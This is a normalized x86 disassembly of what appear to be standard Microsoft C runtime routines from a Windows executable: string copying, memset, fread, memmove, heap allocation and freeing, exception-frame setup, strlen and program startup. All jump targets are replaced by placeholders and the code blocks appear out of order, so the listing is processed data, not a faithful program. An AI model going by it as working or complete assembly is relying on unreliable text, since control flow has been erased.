add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea edi [ ecx - 0x1 ]
jmp r-xdata
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x4 ]
test ah ah
je r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edi edi
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
add ecx 0x1
test dl dl
je r-xdata
lea edi [ ecx - 0x3 ]
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
add edi 0x1
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x2 ]
jmp r-xdata
test eax 0xff000000
je r-xdata
test dh dh
je r-xdata
jmp r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_4046e0
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x100
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_4084b0
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_40475a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0xc ]
and eax 0x10
call sub_405ca6
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_405c3e
add esp 0x14
xor eax eax
jmp r-xdata
pop esi
pop ebp
retn
sub_40478e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
xor edi edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0x10 ] edi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] edi
je r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x18 ]
cmp esi edi
je r-xdata
call sub_405ca6
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
push edi
cmp ebx 0xffffffff
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp [ ebp + 0x14 ] eax
jbe r-xdata
cmp esi edi
je r-xdata
push ebx
push edi
push ecx
call sub_4046e0
add esp 0xc
mov edi [ ebp + 0x10 ]
imul edi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x10 ] edi
mov ebx edi
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp [ ebp + 0x14 ] eax
ja r-xdata
mov [ ebp - 0xc ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
test [ esi + 0xc ] 0x10c
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0xc ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push esi
call sub_4085fe
pop ecx
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
jl r-xdata
mov eax edi
sub eax ebx
xor edx edx
div [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
cmp ebx eax
ja r-xdata
mov ecx 0x7fffffff
xor edx edx
cmp ebx ecx
jbe r-xdata
or [ esi + 0xc ] 0x20
mov edi ebx
cmp ebx eax
jb r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
mov ecx [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
mov [ ecx ] al
mov eax [ esi + 0x18 ]
dec ebx
dec [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
cmp eax [ ebp - 0x4 ]
ja r-xdata
mov eax ebx
mov eax ebx
div [ ebp - 0xc ]
mov eax ebx
mov eax ecx
div [ ebp - 0xc ]
mov eax ecx
jmp r-xdata
cmp edi [ ebp - 0x4 ]
ja r-xdata
mov edi eax
call sub_405ca6
mov [ eax ] 0x22
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_4046e0
add esp 0xc
push eax
push [ ebp - 0x8 ]
push esi
call sub_40432c
pop ecx
push eax
call sub_408ceb
add esp 0xc
test eax eax
je r-xdata
sub eax edx
jmp r-xdata
xor esi esi
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
push edi
push [ esi ]
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call sub_408de8
sub [ esi + 0x4 ] edi
add [ esi ] edi
add [ ebp - 0x8 ] edi
sub ebx edi
add esp 0x10
sub [ ebp - 0x4 ] edi
mov edi [ ebp - 0x10 ]
jmp r-xdata
call sub_405c3e
add esp 0x14
or [ esi + 0xc ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
call sub_405ca6
push esi
push esi
push esi
push esi
mov [ eax ] 0x22
push esi
jmp r-xdata
push [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_4046e0
add esp 0xc
test ebx ebx
jne r-xdata
add [ ebp - 0x8 ] eax
sub ebx eax
sub [ ebp - 0x4 ] eax
jmp r-xdata
sub_404998
push 0xc
push r--data
call sub_405254
xor esi esi
mov [ ebp - 0x1c ] esi
cmp [ ebp + 0x10 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] esi
je r-xdata
cmp [ ebp + 0x18 ] esi
jne r-xdata
push [ ebp + 0x18 ]
call sub_405dc6
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40478e
add esp 0x14
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_404a24
mov eax [ ebp - 0x1c ]
jmp r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
call sub_405299
retn
call sub_405ca6
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_405c3e
add esp 0x14
push [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_4046e0
add esp 0xc
sub_404a50
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_404ad8 ]
jmp [ ecx * 4 + jump_table_404b58 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_404bc4 ]
pop esi
pop edi
pop ebp
jmp sub_408eec
jmp [ ecx * 4 + jump_table_404d60 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_404c64 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_404d60 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_404bc4 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_404d60 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_404bc4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_404bc4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_404bc4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_404d60 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_404d60 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_404d60 ]
sub_404db5
push 0xc
push r--data
call sub_405254
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_405299
retn
cmp [ rw-data ] 0x3
jne r-xdata
push esi
push 0x4
call sub_40917b
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_4091ae
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
call sub_405ca6
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_405c64
mov [ esi ] eax
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_404e0b
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push esi
push eax
call sub_4091de
pop ecx
pop ecx
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
sub_404e43
push 0x10
push r--data
call sub_405254
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_4050ad
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
push ebx
call sub_404db5
pop ecx
jmp r-xdata
call sub_405299
retn
cmp esi 0xffffffe0
jbe r-xdata
xor edi edi
mov [ ebp - 0x1c ] edi
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
test esi esi
jne r-xdata
push esi
call sub_409c81
pop ecx
call sub_405ca6
push 0x4
call sub_40917b
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_4091ae
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_404f87
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov edi [ ebp - 0x1c ]
test esi esi
jne r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
push ebx
push eax
call sub_4096ac
add esp 0xc
test eax eax
je r-xdata
test edi edi
jne r-xdata
push esi
call sub_409c81
pop ecx
test eax eax
je r-xdata
cmp [ rw-data ] edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
jmp r-xdata
inc esi
cmp esi edi
jne r-xdata
push esi
call sub_40998d
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
call sub_405ca6
call sub_405ca6
jmp r-xdata
test edi edi
jne r-xdata
push esi
call sub_409c81
pop ecx
test eax eax
jne r-xdata
test edi edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push edi
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
xor esi esi
inc esi
mov [ ebp + 0xc ] esi
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_405c64
pop ecx
mov [ esi ] eax
jmp r-xdata
call sub_405ca6
cmp [ ebp - 0x20 ] edi
je r-xdata
call sub_405ca6
cmp [ ebp - 0x20 ] edi
jne r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x1c ]
call sub_404a50
push ebx
call sub_4091ae
mov [ ebp - 0x20 ] eax
push ebx
push eax
call sub_4091de
add esp 0x18
mov eax esi
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_405c64
mov [ esi ] eax
pop ecx
mov [ eax ] 0xc
jmp r-xdata
mov [ eax ] 0xc
push eax
push ebx
push [ ebp - 0x1c ]
call sub_404a50
push ebx
push [ ebp - 0x20 ]
call sub_4091de
add esp 0x14
mov eax esi
sub_40505e
push 0xc
push r--data
call sub_405254
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
mov eax [ ebp - 0x1c ]
call sub_405299
retn
push 0x4
call sub_40917b
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_40998d
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4050a4
sub_4050ad
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_409c81
pop ecx
call sub_405ca6
mov [ eax ] 0xc
xor eax eax
push ebx
push edi
mov edi [ HeapAlloc@IAT ]
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
call sub_40a18c
push 0x1e
call sub_409fe1
push 0xff
call sub_409d2d
cmp eax 0x3
jne r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
push esi
call sub_40505e
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
mov eax esi
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
inc esi
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
push [ rw-data ]
call edi
push eax
jmp r-xdata
pop edi
mov eax ebx
pop ebx
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
pop esi
pop ebp
retn
call sub_405ca6
mov [ eax ] esi
push [ ebp + 0x8 ]
call sub_409c81
pop ecx
test eax eax
je r-xdata
call sub_405ca6
mov [ eax ] esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
sub_4051a8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_40a23f
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_405177
pop ecx
sub_4051ec
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
jmp r-xdata
push [ ebp + 0x8 ]
call sub_4050ad
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_409c81
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov esi rw-data
jne r-xdata
push esi
lea ecx [ ebp - 0xc ]
call sub_4051cf
push r--data
lea eax [ ebp - 0xc ]
push eax
call sub_40a2b4
int3
or [ rw-data ] 0x1
mov ecx esi
call sub_405182
push sub_40f950
call sub_405612
pop ecx
sub_405254
push sub_4052b0
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_4052b0
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4045c5
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4045c5
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_40833c
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_4082f2
mov [ ebp - 0x1 ] 0x1
test eax eax
jl r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_4045c5
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4045c5
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_408322
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_40833c
mov eax [ ebp + 0xc ]
push rw-data
call sub_40a390
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_4045c5
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_408309
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4045c5
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ rw-data ]
add esp 0x8
sub_405460
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_4054eb
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push [ rw-data ]
call sub_40a4c8
push [ rw-data ]
mov edi eax
mov [ ebp - 0x4 ] edi
call sub_40a4c8
mov esi eax
pop ecx
pop ecx
cmp esi edi
jb r-xdata
xor eax eax
mov ebx esi
sub ebx edi
lea eax [ ebx + 0x4 ]
cmp eax 0x4
jb r-xdata
push edi
call sub_40aac9
mov edi eax
lea eax [ ebx + 0x4 ]
pop ecx
cmp edi eax
jae r-xdata
push [ ebp + 0x8 ]
call sub_40a44d
mov [ esi ] eax
add esi 0x4
push esi
call sub_40a44d
pop ecx
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
pop ecx
jmp r-xdata
mov eax 0x800
cmp edi eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax edi
cmp eax edi
jb r-xdata
mov eax edi
lea eax [ edi + 0x10 ]
cmp eax edi
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_40aa7b
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_40aa7b
pop ecx
pop ecx
test eax eax
je r-xdata
sar ebx 0x2
push eax
lea esi [ eax + ebx * 4 ]
call sub_40a44d
pop ecx
mov [ rw-data ] eax
sub_4055a5
mov edi edi
push esi
push 0x4
push 0x20
call sub_40aa2f
mov esi eax
push esi
call sub_40a44d
add esp 0xc
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_4055d6
push 0xc
push r--data
call sub_405254
call sub_409d45
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_4054eb
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40560c
mov eax [ ebp - 0x1c ]
call sub_405299
retn
sub_405652
push 0x58
push r--data
call sub_405254
xor esi esi
mov [ ebp - 0x4 ] esi
lea eax [ ebp - 0x68 ]
push eax
call [ GetStartupInfoA@IAT ]
push 0xfffffffe
pop edi
mov [ ebp - 0x4 ] edi
mov eax 0x5a4d
cmp [ __dos_header ] ax
jne r-xdata
mov [ ebp - 0x1c ] esi
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
call sub_40a85d
test eax eax
jne r-xdata
push 0x1c
call sub_405629
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
call sub_40b1e5
mov [ ebp - 0x4 ] ebx
call sub_406d47
test eax eax
jge r-xdata
push 0x10
call sub_405629
cmp [ eax + r--data ] 0xe
jbe r-xdata
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_40b0ae
mov [ rw-data ] eax
call sub_40aff3
test eax eax
jge r-xdata
push 0x1b
call sub_409cd9
pop ecx
xor ecx ecx
cmp [ eax + r--data ] esi
setne cl
mov [ ebp - 0x1c ] ecx
jmp r-xdata
call sub_40ad7b
test eax eax
jge r-xdata
push 0x8
call sub_409cd9
pop ecx
xor ebx ebx
inc ebx
push ebx
call sub_408fcf
pop ecx
test eax eax
jne r-xdata
push ebx
call sub_409d98
pop ecx
cmp eax esi
je r-xdata
push 0x9
call sub_409cd9
pop ecx
call sub_40ad1c
test [ ebp - 0x3c ] bl
je r-xdata
push eax
call sub_409cd9
pop ecx
push 0xa
pop ecx
movzx ecx [ ebp - 0x38 ]
jmp r-xdata
call sub_409f75
mov [ ebp - 0x4 ] edi
jmp sub_4057b2
push eax
call sub_409f49
push ecx
push eax
push esi
push __dos_header
call sub_404066
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] esi
jne r-xdata
sub_4057da
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_40691e
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_405ccc
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_40691e
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_40691e
push 0x1
mov edi eax
call sub_40691e
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_406898
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_405876
push 0x10
push r--data
call sub_405254
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_405cb9
and [ eax ] 0x0
call sub_405ca6
mov [ eax ] 0x9
call sub_405cb9
mov [ eax ] edi
call sub_405ca6
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_405c3e
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_405299
retn
or eax 0xffffffff
jmp r-xdata
